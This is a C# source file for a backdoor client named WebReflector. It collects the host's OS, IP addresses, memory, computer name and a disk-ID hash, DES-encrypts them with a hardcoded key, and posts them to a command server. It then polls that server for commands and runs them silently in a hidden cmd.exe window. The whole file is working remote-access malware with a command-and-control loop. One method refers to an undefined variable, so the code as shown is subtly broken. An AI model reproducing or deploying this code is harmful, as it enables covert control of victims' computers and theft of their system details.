using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Security.Cryptography;
using System.Text;

namespace WebReflector
{
    class WebReflect
    {
        public static string IP = "127.0.0.1";

        public static string pageReq(string Url, string postDataStr)
        {
            var request = (HttpWebRequest)WebRequest.Create(Url);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = Encoding.UTF8.GetByteCount(postDataStr);
            var myRequestStream = request.GetRequestStream();
            var myStreamWriter = new StreamWriter(myRequestStream, Encoding.GetEncoding("gb2312"));
            myStreamWriter.Write(postDataStr);
            myStreamWriter.Close();

            var response = (HttpWebResponse)request.GetResponse();

            var myResponseStream = response.GetResponseStream();
            var myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
            var retString = myStreamReader.ReadToEnd();
            myStreamReader.Close();
            myResponseStream.Close();

            return retString;
        }

        private static string pageGetReq(string link, string datastr)
        {
            var request = (HttpWebRequest)WebRequest.Create(link + (datastr == "" ? "" : "?") + datastr);
            request.Method = "GET";
            request.ContentType = "text/html;charset=UTF-8";

            var response = (HttpWebResponse)request.GetResponse();
            var myResponseStream = response.GetResponseStream();
            var myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
            var retString = myStreamReader.ReadToEnd();
            myStreamReader.Close();
            myResponseStream.Close();

            return retString;
        }

        public static string ReplaceKeyword(string words)
        {
            return words.Replace("\"", " ").Replace("\'", " ").Replace(",", " ");
        }
        public static string shrink(string str)
        {
            return str.Replace("旗舰版", "Ult").Replace("Ultimate", "Ult")
                      .Replace("企业版", "Ent").Replace("Enterpise", "Ent")
                      .Replace("家庭高级版", "HomeP").Replace("Home Professional", "HomeP")
                      .Replace("家庭普通版", "HomeB").Replace("Home Basic", "HomeB")
                      .Replace("专业版", "Pro").Replace("Professional", "Pro");
        }

        public static bool sendInfo()
        {
            var OSname = ReplaceKeyword(SysInfo.GetOSname());
            var InnerIP = ReplaceKeyword(SysInfo.GetInnerIPAddress());
            var OutterIP = ReplaceKeyword(SysInfo.GetOutterIPAddress());
            var Mem = ReplaceKeyword(SysInfo.GetPhysicalMemory());
            var PCname = ReplaceKeyword(SysInfo.GetComputerName());
            var guid = ReplaceKeyword(SysInfo.GetHardDiskID());
            var datastr = "(\'" + OSname.Replace("Microsoft ","").Replace("Windows","Win") + "\',\'" + PCname + "\',\'" + Mem + "\',\'" + InnerIP + "\',\'" + OutterIP + "\',\'" + MD5_32(guid) + "\')";
            //string datastr = "('MS win 7 旗舰版 ', 'LUMINGFEI-PC', '17.9G', '172.16.16.102', '114.240.48.175', '494CB2EA35')";
            var cryptedata = "datastr=" + Encrypt(shrink(datastr), "zootopia", "19670802").Replace("+", "%2B");
  /*          string file = "log.txt";
            string content = datastr + "\n" + cryptedata;
            if (!File.Exists(file) == true)
            {
                FileStream myFs = new FileStream(file, FileMode.Create);
                StreamWriter mySw = new StreamWriter(myFs);
                mySw.Write(content);
                mySw.Close();
                myFs.Close();
            }*/
            pageReq("http://" + IP + "/test.php", cryptedata);

            return true;
        }
        public static byte[] Compress(byte[] data)
        {
            try
            {
                var ms = new MemoryStream();
                var zip = new GZipStream(ms, CompressionMode.Compress, true);
                zip.Write(data, 0, data.Length);
                zip.Close();
                var buffer = new byte[ms.Length];
                ms.Position = 0;
                ms.Read(buffer, 0, buffer.Length);
                ms.Close();
                return buffer;

            }
            catch (Exception e)
            {
                throw new Exception(e.Message);
            }
        }
        public static string CompressString(string str)
        {
            var compressString = "";
            var compressBeforeByte = Encoding.GetEncoding("UTF-8").GetBytes(str);
            var compressAfterByte = Compress(compressBeforeByte);
            //compressString = Encoding.GetEncoding("UTF-8").GetString(compressAfterByte);  
            compressString = Convert.ToBase64String(compressAfterByte);
            return compressString;
        }

        public static string getCMD()
        {
            var command = pageReq("http://"+IP+"/test.php", "datastr=" + Encrypt("reqcmd", "zootopia", "19670802").Replace("+", "%2B"));
            return Decrypt(command, "zootopia", "19670802");
        }

        public static string theDirtyworks(string str)
        {
            var commandtype = str.Substring(0, 4);
            var command = str.Substring(4);
            var output = "";
            switch (commandtype)
            {
                case "COMD":
                    output = theDirtyCMD(command);
                    break;
                default:
                    output = "";
                    break;
            }

            return output;
        }

        public static string theDirtyCMD(string cmd)
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();

            p.StandardInput.WriteLine(str + " & exit");

            p.StandardInput.AutoFlush = true;

            var output = p.StandardOutput.ReadToEnd();

            p.WaitForExit();//等待程序执行完退出进程
            p.Close();

            return output;
        }

        public static string Encrypt(string sourceString, string key, string iv)
        {
            try
            {
                byte[] btKey = Encoding.UTF8.GetBytes(key);
                byte[] btIV = Encoding.UTF8.GetBytes(iv);
                DESCryptoServiceProvider des = new DESCryptoServiceProvider();
                using (MemoryStream ms = new MemoryStream())
                {
                    byte[] inData = Encoding.UTF8.GetBytes(sourceString);
                    try
                    {
                        using (CryptoStream cs = new CryptoStream(ms, des.CreateEncryptor(btKey, btIV), CryptoStreamMode.Write))
                        {
                            cs.Write(inData, 0, inData.Length);
                            cs.FlushFinalBlock();
                        }
                        return Convert.ToBase64String(ms.ToArray());
                    }
                    catch
                    {
                        return sourceString;
                    }
                }
            }
            catch { }
            return "DES加密出错";
        }
        public static string Decrypt(string encryptedString, string key, string iv)
        {
            byte[] btKey = Encoding.UTF8.GetBytes(key);
            byte[] btIV = Encoding.UTF8.GetBytes(iv);
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            using (MemoryStream ms = new MemoryStream())
            {
                byte[] inData = Convert.FromBase64String(encryptedString);
                try
                {
                    using (CryptoStream cs = new CryptoStream(ms, des.CreateDecryptor(btKey, btIV), CryptoStreamMode.Write))
                    {
                        cs.Write(inData, 0, inData.Length);
                        cs.FlushFinalBlock();
                    }
                    return Encoding.UTF8.GetString(ms.ToArray());
                }
                catch
                {
                    return encryptedString;
                }
            }
        }
        public static string MD5_32(string sourceString)
        {
            string ConvertString = sourceString;
            MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();
            string t2 = BitConverter.ToString(md5.ComputeHash(UTF8Encoding.Default.GetBytes(ConvertString)), 4, 8);
            t2 = t2.Replace("-", "");
            return t2.Substring(0,10);
        }
    }
}
